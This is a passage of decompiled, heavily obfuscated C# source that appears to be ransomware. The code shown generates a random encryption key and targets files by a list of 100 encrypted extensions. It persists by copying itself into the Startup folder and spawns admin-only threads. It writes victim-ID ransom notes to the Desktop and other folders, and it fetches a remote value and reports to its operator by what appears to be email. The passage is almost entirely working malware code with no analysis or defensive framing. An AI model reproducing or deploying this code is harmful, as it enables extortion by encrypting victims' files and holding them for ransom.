									sZrgcGPnICGjr(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy, JgtXDzoKBYSkMTJ);
								}
								else
								{
									sZrgcGPnICGjr(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (QCmKQKwvWBrFEj)
								{
									try
									{
										File.AppendAllText(hBPcxbXfrBbYZwL, _001A(107385608) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + _001A(107385886) + ex14.Message + _001A(107396224));
									}
									catch (Exception)
									{
									}
								}
								WetxdZxAdgUqT++;
								return;
							}
						}
						if (OmLPyoScyL)
						{
							if (UEavMcURXNKX != _001A(107385868))
							{
								NdxUyyyATtE(CS_0024_003C_003E8__locals0.TpoSFZXjxy + UEavMcURXNKX, bytes2);
							}
							else
							{
								NdxUyyyATtE(CS_0024_003C_003E8__locals0.TpoSFZXjxy, bytes2);
							}
						}
					}
					end_IL_031b_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ab8;
			IL_0ab8:
			lJCScpebPQHSGPj.Remove(CS_0024_003C_003E8__locals0.TpoSFZXjxy);
		}

		static bFSgRwkHPWbo()
		{
			Strings.CreateGetStringDelegate(typeof(bFSgRwkHPWbo));
		}
	}

	private sealed class VtnthPHwsfAntP
	{
		public string iUtYNLjucmwZT;

		public string YQALLUKldoi;

		public void _003CEncrypt2_003Eb__3f()
		{
			while (true)
			{
				try
				{
					File.Delete(iUtYNLjucmwZT);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__40()
		{
			while (true)
			{
				try
				{
					if (File.Exists(YQALLUKldoi))
					{
						File.Delete(YQALLUKldoi);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string vRdITQqTvax;

	public static byte[] JgtXDzoKBYSkMTJ;

	public static string ZfmtEkVSEoLZCTN;

	public static string BKTddpEXUb;

	public static List<string> dSQQLmBsItoVm;

	public static List<string> qNQrNVjGAFSGb;

	public static string ClUYmrEOMeRE;

	public static string SEgFdxrVdmAS;

	public static string HxoFecoXKSIx;

	public static string kehqXSWYmvO;

	public static int TLqHZRbWxRD;

	public static string jyiNxqfYATtd;

	public static string NetkxOoqORdjco;

	public static string LqATWbeXtbBHAAfd;

	public static string tpBnNLFxKkRvj;

	public static string mOrmkgrogTmQzVS;

	public static string kvGhhsDoDxIjo;

	public static string nZdynMPuOfLU;

	public static string kBlJeUxHUUqobgl;

	public static List<string> EOjkFDoZgom;

	public static List<string> aFoYhEArnYRtqzv;

	public static string GfhAxfMvRNVoVF;

	public static string jnnEfVuAKzxGQ;

	public static string zEHRRjZSnCPR;

	public static List<string> xaJTZrMmiQRAQ;

	public static string YaJjvEGjPYXsk;

	private static string ZiqYDgfFaxGQ;

	public static string CWdRZmKsDhxK;

	public static string wVHzQSJwQsGw;

	public static List<string> esUMHAcHobte;

	public static List<string> XYTVFNmWPjt;

	public static List<string> cYRnUVUQWZjBbG;

	public static List<string> DYUDOtUaolJR;

	public static string MaECdwVpsczmu;

	public static List<string> crllYeSsbsC;

	public static List<string> TirtJYKVVld;

	public static string PowXyKwNktZ;

	public static string xWhRipHNXofPbg;

	internal static DateTime oLBievUyDcbkUxU;

	internal static DateTime zEbXuEhBhrGIBiE;

	public static string ZgMAQkWlMGVlQB;

	public static string phsLIEBLTPR;

	public static string GPURiHCEswAQqyG;

	public static string gOnzhZVscHtHEA;

	public static string UhahWHggJKRXH;

	public static string sBJyvWUPVYJGomCj;

	public static string HpzDrsLZJMEAsBEP;

	public static string XLjwIPnIAHXCZ;

	public static List<string> qUoKxlxkuFsMOBYn;

	public static string ASnTkTTzzlTA;

	public static string UqzEWVXQurQ;

	public static string RduxjsdlGU;

	public static string vnKnIgGgkpYwK;

	public static string FgZHwwTkLhi;

	public static string vvtVglKzWhlus;

	public static string pEvrDrkNSajWbK;

	public static string mSLrFwQNhiEl;

	public static string UalKDTXkwjDKg;

	public static string ARnwrVkoxumnn;

	public static string eLQAQoIdeENep;

	public static string xYYLcdseTgQWbebv;

	public static string cfoPXtIlVaAipP;

	public static string WGykFPOvUTVh;

	public static string UoSZJpwWoej;

	public static string AEyeldIZLhfif;

	public static string GdsWqHYzFrLi;

	public static string qzFWqUKZSL;

	public static string PZzpKsqvMdSQSH;

	public static string ugIteiXGeHBYH;

	public static string TAqzrCZOZCbktGxO;

	public static string fzCzbnmtGWQLw;

	public static string ahgwKYBhqErWt;

	public static string HIjyMnEjqFkIVFWP;

	public static string iNAczKOivbE;

	public static string qIHInwsrXSVk;

	public static string YtsYOxvPhpYvsqia;

	public static string lNQWlldAsvUOD;

	public static string HXGAbpusxAtHwkm;

	public static string[] JRIWDxjKnYP;

	public static string TMMTTmWVJnveZ;

	public static bool LZWNsbTTjOGKx;

	public static string LbuRUPTRClHXO;

	public static bool OmLPyoScyL;

	public static bool sCehMLCbUUnVqZ;

	public static bool GHovUqtwvuKH;

	public static bool fVbviOHbEwWlbJc;

	public static string hBPcxbXfrBbYZwL;

	public static bool QCmKQKwvWBrFEj;

	public static bool njCLqJViuRVQKe;

	public static bool JQnvKumvWqslT;

	public static bool aNXCscvybLN;

	public static bool heKpdwyJrkK;

	public static string TyXSqILJGWkm;

	public static bool IHUVFGfndtpl;

	public static Stopwatch EjlvAeqfnx;

	public static int WetxdZxAdgUqT;

	public static int JSBuxhHRYzkt;

	public static bool uDFeFGGkwluj;

	public static string cshPaWeUxvVg;

	public static string[] hSElXxgkerZPAvg;

	public static List<string> BdqapSgxTAf;

	public static int mRRsxGPnuCU;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	[NonSerialized]
	internal static GetString _0016;

	private static void Main(string[] P_0)
	{
		try
		{
			BVRfrYkBdes CS_0024_003C_003E8__locals0 = new BVRfrYkBdes();
			CS_0024_003C_003E8__locals0.tVcAEMabcgzREe = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process P_0) => P_0.ProcessName == CS_0024_003C_003E8__locals0.tVcAEMabcgzREe) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			rFcCqwhZUV.PPGBbqZHDPyumOc(ZiqYDgfFaxGQ);
		}
		catch (Exception)
		{
		}
		try
		{
			if (qIHInwsrXSVk == _0016(107396837))
			{
				Thread thread = new Thread(hVtNPnvGNtwuMv.TSpvLouHuCM);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (LqATWbeXtbBHAAfd == _0016(107396837))
		{
			Thread.Sleep(int.Parse(tpBnNLFxKkRvj));
		}
		if (RduxjsdlGU == _0016(107396837))
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					ORhCIKOMJVstHJ CS_0024_003C_003E8__locals1 = new ORhCIKOMJVstHJ();
					CS_0024_003C_003E8__locals1.HXJlWfIOGmEEOv = new string[4]
					{
						KsnoBrbTQSaN(_0016(107396832)),
						KsnoBrbTQSaN(_0016(107396783)),
						KsnoBrbTQSaN(_0016(107396798)),
						KsnoBrbTQSaN(_0016(107396769))
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						iYmwFcKSkoMOOW.xiDVoiTHkoM(CS_0024_003C_003E8__locals1.HXJlWfIOGmEEOv);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				gIXFdNsbZyee.mJudWhgTJOJ(KsnoBrbTQSaN(_0016(107396783)));
			}
			catch
			{
			}
			try
			{
				gIXFdNsbZyee.mJudWhgTJOJ(KsnoBrbTQSaN(_0016(107396769)));
			}
			catch
			{
			}
			try
			{
				gIXFdNsbZyee.mJudWhgTJOJ(KsnoBrbTQSaN(_0016(107396720)));
			}
			catch
			{
			}
			try
			{
				gIXFdNsbZyee.mJudWhgTJOJ(KsnoBrbTQSaN(_0016(107396798)));
			}
			catch
			{
			}
			Thread thread3 = new Thread(iYmwFcKSkoMOOW.BcwzNoRHcDXpdnP);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && HpzDrsLZJMEAsBEP == _0016(107396837))
		{
			try
			{
				whdhjUDgfqKLT(KsnoBrbTQSaN(_0016(107396735)));
			}
			catch
			{
			}
		}
		try
		{
			if (nZdynMPuOfLU == _0016(107396837) && UHfukmSRDidq.ETgVlCMUDmun())
			{
				new EYeYEZtDXZdk().OfOVzWsVFfe(false);
				UHfukmSRDidq.UERnhubenVRN();
			}
		}
		catch (Exception)
		{
		}
		if (jnnEfVuAKzxGQ == _0016(107396837) && UHfukmSRDidq.ETgVlCMUDmun())
		{
			new EYeYEZtDXZdk().OfOVzWsVFfe(false);
			new EYeYEZtDXZdk().pmYRPBmxbKDvQSJ();
		}
		if (NetkxOoqORdjco == _0016(107396837))
		{
			ONewRWdEXAy.TYNCYWXgrUzf();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + _0016(107397110);
			string text2 = text + Path.GetFileName(fileName);
			if (kehqXSWYmvO == _0016(107396837) && fileName != text2)
			{
				Thread thread4 = new Thread(SVmNkLEVJC);
				thread4.IsBackground = true;
				thread4.Priority = ThreadPriority.Normal;
				thread4.Start();
			}
			if (ClUYmrEOMeRE == _0016(107396837) && mainModule != null && fileName != text2)
			{
				try
				{
					TLqHZRbWxRD = vEgBTPjBfNWA(0, EOjkFDoZgom.Count);
					File.Copy(fileName, text + EOjkFDoZgom[TLqHZRbWxRD], overwrite: true);
					Process.Start(text + EOjkFDoZgom[TLqHZRbWxRD]);
					QgzadyGmZecBjF();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (PowXyKwNktZ == _0016(107396837) && DateTime.Now < oLBievUyDcbkUxU)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (xWhRipHNXofPbg == _0016(107396837) && DateTime.Now > zEbXuEhBhrGIBiE)
			{
				QgzadyGmZecBjF();
			}
		}
		catch
		{
		}
		GNjgVGOIzcp();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> xYTVFNmWPjt = XYTVFNmWPjt;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string P_0)
					{
						MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385783)), P_0);
					};
				}
				Parallel.ForEach(xYTVFNmWPjt, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				List<string> source = cYRnUVUQWZjBbG;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string P_0)
					{
						MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385802)), P_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				if (HXGAbpusxAtHwkm == _0016(107396837))
				{
					string[] jRIWDxjKnYP = JRIWDxjKnYP;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string P_0)
						{
							MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385802)), _0016(107385745) + P_0 + _0016(107385768));
						};
					}
					Parallel.ForEach(jRIWDxjKnYP, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				if (!qgGdJmyvbjfjKJGn().Contains(_0016(107385456)))
				{
					pBYecYRZtlUM(MaECdwVpsczmu);
				}
				else
				{
					List<string> dYUDOtUaolJR = DYUDOtUaolJR;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string P_0)
						{
							MkUJPBjeBrD(KsnoBrbTQSaN(XoauCcwIXoBdG(_0016(107385763))), P_0);
						};
					}
					Parallel.ForEach(dYUDOtUaolJR, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				}
				List<string> source2 = crllYeSsbsC;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string P_0)
					{
						MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385738)), P_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread5 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread5.Priority = ThreadPriority.Normal;
		thread5.IsBackground = true;
		thread5.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), _0016(107397105))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), _0016(107397105)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(_0016(107397120)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !dSQQLmBsItoVm.Contains(text6) && text6 != _0016(107397099) && text6 != _0016(107397046) && text6 != _0016(107397057))
								{
									dSQQLmBsItoVm.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(_0016(107397028)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == _0016(107396983))
						{
							cfoPXtIlVaAipP = _0016(107396837);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == _0016(107396974))
						{
							cfoPXtIlVaAipP = _0016(107396997);
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (QCmKQKwvWBrFEj)
			{
				try
				{
					File.AppendAllText(hBPcxbXfrBbYZwL, _0016(107396992) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (cfoPXtIlVaAipP == _0016(107396997))
		{
			riqJHGtUsgf();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && GHovUqtwvuKH)
			{
				try
				{
					Thread thread6 = new Thread(FTmJnnLNQoCqT.siNfIsKXeLHWFyi);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			MkUJPBjeBrD(_0016(107396403), KsnoBrbTQSaN(_0016(107396422)));
		}
		SecureString secureString = new SecureString();
		if (GPURiHCEswAQqyG == _0016(107396997))
		{
			Random random = new Random();
			for (int k = 0; k < 32; k++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) == 34 || Convert.ToInt32(value) == 92)
				{
					k--;
				}
				else
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
			}
		}
		else
		{
			SEgFdxrVdmAS = _0016(107396349);
		}
		HxoFecoXKSIx = WvhZaNjlczTpSemA.ApMfxATNQTnF(NMrXDqjSPVqJ(secureString));
		if (JQnvKumvWqslT)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), TyXSqILJGWkm)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), TyXSqILJGWkm), string.Concat(KsnoBrbTQSaN(_0016(107396272)), new WebClient().DownloadString(KsnoBrbTQSaN(_0016(107396247))), _0016(107396206), KsnoBrbTQSaN(_0016(107396233)), DateTime.Now, _0016(107396206), KsnoBrbTQSaN(_0016(107396704)), HxoFecoXKSIx));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), TyXSqILJGWkm), _0016(107396647) + HxoFecoXKSIx);
				}
			}
			catch (Exception ex9)
			{
				if (QCmKQKwvWBrFEj)
				{
					try
					{
						File.AppendAllText(hBPcxbXfrBbYZwL, _0016(107396618) + ex9.Message + _0016(107396206));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		EyFwbIkACwPt.AOLqVGzBOl(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ugIteiXGeHBYH), uINUJIUsUOtlNg(HxoFecoXKSIx), null, null, _0016(107396537), _0016(107396552), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			mkibrbCOqshi();
		}
		try
		{
			try
			{
				if (IHUVFGfndtpl)
				{
					Console.WriteLine(_0016(107396503));
				}
			}
			catch
			{
			}
			NNPLhsJMYMb(new string[1] { _0016(107396486) }, new string[100]
			{
				_0016(107396477),
				_0016(107395928),
				_0016(107395923),
				_0016(107395946),
				_0016(107395941),
				_0016(107395936),
				_0016(107395899),
				_0016(107395894),
				_0016(107395889),
				_0016(107395916),
				_0016(107395911),
				_0016(107395906),
				_0016(107395865),
				_0016(107395860),
				_0016(107395883),
				_0016(107395878),
				_0016(107395873),
				_0016(107395836),
				_0016(107395831),
				_0016(107395826),
				_0016(107395849),
				_0016(107395844),
				_0016(107395839),
				_0016(107395802),
				_0016(107395797),
				_0016(107395792),
				_0016(107395819),
				_0016(107395814),
				_0016(107395809),
				_0016(107395772),
				_0016(107395767),
				_0016(107395762),
				_0016(107395757),
				_0016(107395784),
				_0016(107395775),
				_0016(107395738),
				_0016(107395733),
				_0016(107395728),
				_0016(107395899),
				_0016(107395755),
				_0016(107395889),
				_0016(107395746),
				_0016(107395741),
				_0016(107395704),
				_0016(107395699),
				_0016(107395694),
				_0016(107395721),
				_0016(107395716),
				_0016(107395711),
				_0016(107396186),
				_0016(107396181),
				_0016(107396176),
				_0016(107396203),
				_0016(107396198),
				_0016(107396193),
				_0016(107396156),
				_0016(107396151),
				_0016(107396146),
				_0016(107396169),
				_0016(107396164),
				_0016(107396123),
				_0016(107396110),
				_0016(107395755),
				_0016(107396129),
				_0016(107396088),
				_0016(107396079),
				_0016(107396102),
				_0016(107396093),
				_0016(107396052),
				_0016(107396047),
				_0016(107396070),
				_0016(107396061),
				_0016(107396020),
				_0016(107396015),
				_0016(107396042),
				_0016(107396037),
				_0016(107396032),
				_0016(107395995),
				_0016(107395990),
				_0016(107395981),
				_0016(107396008),
				_0016(107396003),
				_0016(107395998),
				_0016(107395961),
				_0016(107395956),
				_0016(107395979),
				_0016(107395970),
				_0016(107395965),
				_0016(107395757),
				_0016(107395416),
				_0016(107395411),
				_0016(107395406),
				_0016(107395433),
				_0016(107395428),
				_0016(107395387),
				_0016(107395382),
				_0016(107395377),
				_0016(107395400),
				_0016(107395395),
				_0016(107395390)
			}, new string[0], NMrXDqjSPVqJ(secureString), _0016(107395353));
		}
		catch (Exception ex11)
		{
			if (QCmKQKwvWBrFEj)
			{
				try
				{
					File.AppendAllText(hBPcxbXfrBbYZwL, _0016(107395372) + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107395315)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107395315));
				streamWriter.WriteLine(KsnoBrbTQSaN(_0016(107395282)));
				streamWriter.WriteLine(_0016(107396206));
				streamWriter.WriteLine(KsnoBrbTQSaN(_0016(107392888)));
				streamWriter.WriteLine(HxoFecoXKSIx);
				if (CWdRZmKsDhxK == _0016(107396997))
				{
					streamWriter.WriteLine(_0016(107396206));
					streamWriter.WriteLine(KsnoBrbTQSaN(_0016(107392343)) + Convert.ToString(xaJTZrMmiQRAQ.Count));
				}
				if (uDFeFGGkwluj)
				{
					streamWriter.WriteLine(_0016(107396206));
					streamWriter.WriteLine(KsnoBrbTQSaN(_0016(107392298)));
					streamWriter.WriteLine(wihATTbwYdHSl.MVogxnZmiDFB());
				}
			}
			else
			{
				string text8 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107395315));
				if (!text8.Contains(HxoFecoXKSIx) && !OmLPyoScyL)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107395315), _0016(107392265) + HxoFecoXKSIx);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in aFoYhEArnYRtqzv)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + _0016(107395315)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107395315), item + _0016(107395315), overwrite: true);
				}
				else
				{
					string text9 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107395315));
					if (!text9.Contains(HxoFecoXKSIx) && !OmLPyoScyL)
					{
						File.AppendAllText(item + _0016(107395315), _0016(107392265) + HxoFecoXKSIx);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!fVbviOHbEwWlbJc && num > 10)
			{
				break;
			}
		}
		if (ahgwKYBhqErWt == _0016(107396837))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107392236)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107392236));
					streamWriter2.WriteLine(KsnoBrbTQSaN(_0016(107392203)));
					streamWriter2.WriteLine(_0016(107396206));
					streamWriter2.WriteLine(KsnoBrbTQSaN(_0016(107388093)));
					streamWriter2.WriteLine(HxoFecoXKSIx + KsnoBrbTQSaN(_0016(107388516)));
					if (CWdRZmKsDhxK == _0016(107396997))
					{
						streamWriter2.WriteLine(_0016(107396206));
						streamWriter2.WriteLine(KsnoBrbTQSaN(_0016(107388471)) + KsnoBrbTQSaN(_0016(107392343)) + Convert.ToString(xaJTZrMmiQRAQ.Count) + KsnoBrbTQSaN(_0016(107388516)));
					}
					if (uDFeFGGkwluj)
					{
						streamWriter2.WriteLine(_0016(107396206));
						streamWriter2.WriteLine(KsnoBrbTQSaN(_0016(107392298)));
						streamWriter2.WriteLine(wihATTbwYdHSl.MVogxnZmiDFB());
					}
				}
				else
				{
					string text10 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107395315));
					if (!text10.Contains(HxoFecoXKSIx) && !OmLPyoScyL)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107392236), KsnoBrbTQSaN(_0016(107388471)) + _0016(107392265) + HxoFecoXKSIx + KsnoBrbTQSaN(_0016(107388516)));
					}
				}
			}
			catch
			{
			}
		}
		if (YaJjvEGjPYXsk == _0016(107396837))
		{
			try
			{
				if (CWdRZmKsDhxK == _0016(107396997))
				{
					wihATTbwYdHSl.TBgyjRIHMhIJRYs(_0016(107388410), _0016(107388405), _0016(107388424), string.Concat(KsnoBrbTQSaN(_0016(107396272)), new WebClient().DownloadString(KsnoBrbTQSaN(_0016(107396247))), _0016(107388415), KsnoBrbTQSaN(_0016(107396233)), DateTime.Now, _0016(107396206), KsnoBrbTQSaN(_0016(107388378)), Convert.ToString(xaJTZrMmiQRAQ.Count), _0016(107396206), KsnoBrbTQSaN(_0016(107396704)), HxoFecoXKSIx));
				}
				else
				{
					wihATTbwYdHSl.TBgyjRIHMhIJRYs(_0016(107388410), _0016(107388405), _0016(107388424), string.Concat(KsnoBrbTQSaN(_0016(107396272)), new WebClient().DownloadString(KsnoBrbTQSaN(_0016(107396247))), _0016(107388415), KsnoBrbTQSaN(_0016(107396233)), DateTime.Now, _0016(107396206), KsnoBrbTQSaN(_0016(107388378)), Convert.ToString(xaJTZrMmiQRAQ.Count), _0016(107396206), KsnoBrbTQSaN(_0016(107396704)), HxoFecoXKSIx));
				}
			}
			catch
			{
			}
		}
		if (kBlJeUxHUUqobgl == _0016(107396837))
		{
			try
			{
				rUBMrSweGbqw.gCojoUEPTW(new Uri(_0016(107388361)));
			}
			catch
			{
			}
		}
		if (ahgwKYBhqErWt == _0016(107396997))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107395315)))
				{
					Process.Start(KsnoBrbTQSaN(_0016(107388360)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107395315));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107392236)))
				{
					Process.Start(KsnoBrbTQSaN(_0016(107388303)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _0016(107392236));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(vvtVglKzWhlus))
		{
			try
			{
				File.Delete(vvtVglKzWhlus);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), _0016(107397105))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), _0016(107397105)));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(hBPcxbXfrBbYZwL, _0016(107388318) + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (QCmKQKwvWBrFEj)
		{
			try
			{
				File.AppendAllText(hBPcxbXfrBbYZwL, _0016(107387729));
			}
			catch (Exception)
			{
			}
		}
		if (vRdITQqTvax == _0016(107387748))
		{
			QgzadyGmZecBjF();
		}
	}

	public static void SVmNkLEVJC()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(KsnoBrbTQSaN(_0016(107387707)), KsnoBrbTQSaN(_0016(107387585)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int vEgBTPjBfNWA(int P_0, int P_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(P_0, P_1);
	}

	public static List<string> jEnteCvESf(string P_0, string[] P_1, string P_2, string[] P_3, string P_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(P_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (text.Contains(_0016(107387556)) || text.Contains(_0016(107387531)) || text.Contains(_0016(107388010)) || text.ToLower().Contains(_0016(107387961)) || text.ToLower().Contains(_0016(107387980)) || text.Contains(_0016(107387923)) || text.Contains(_0016(107387934)) || text.ToLower().Contains(_0016(107387889)) || text.ToLower().Contains(_0016(107387908)) || text.ToLower().Contains(_0016(107387871)) || text.ToLower().Contains(_0016(107387830)) || text.ToLower().Contains(_0016(107387845)) || text.ToLower().Contains(_0016(107387800)) || text.ToLower().Contains(_0016(107387819)) || text.ToLower().Contains(_0016(107387766)))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_01f1;
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(_0016(107387773)) && !fileInfo.FullName.Contains(_0016(107387244)) && !fileInfo.FullName.Contains(_0016(107387195)) && !fileInfo.FullName.Contains(_0016(107387210)) && !fileInfo.FullName.Contains(_0016(107387161)) && !fileInfo.FullName.Contains(_0016(107387176)) && !fileInfo.FullName.Contains(_0016(107387127)) && !fileInfo.FullName.Contains(_0016(107387142)) && !fileInfo.FullName.Contains(_0016(107387097)) && !fileInfo.FullName.Contains(_0016(107387108)) && !fileInfo.FullName.ToLower().Contains(_0016(107387063)) && !fileInfo.FullName.ToLower().Contains(_0016(107387082)) && !fileInfo.FullName.ToLower().Contains(_0016(107387033)) && !fileInfo.FullName.ToLower().Contains(_0016(107387048)) && !fileInfo.FullName.Contains(KsnoBrbTQSaN(_0016(107386999))) && !fileInfo.FullName.Contains(_0016(107387006)) && !fileInfo.FullName.Contains(_0016(107397105)) && !fileInfo.FullName.Contains(_0016(107387473)) && !fileInfo.FullName.EndsWith(_0016(107395353)) && !fileInfo.FullName.EndsWith(_0016(107387448)) && !fileInfo.FullName.EndsWith(_0016(107387443)) && !fileInfo.FullName.EndsWith(_0016(107387438)) && !fileInfo.FullName.EndsWith(_0016(107387465)) && !fileInfo.FullName.Contains(_0016(107387460)) && !fileInfo.FullName.Contains(ugIteiXGeHBYH) && !fileInfo.FullName.Contains(hBPcxbXfrBbYZwL) && 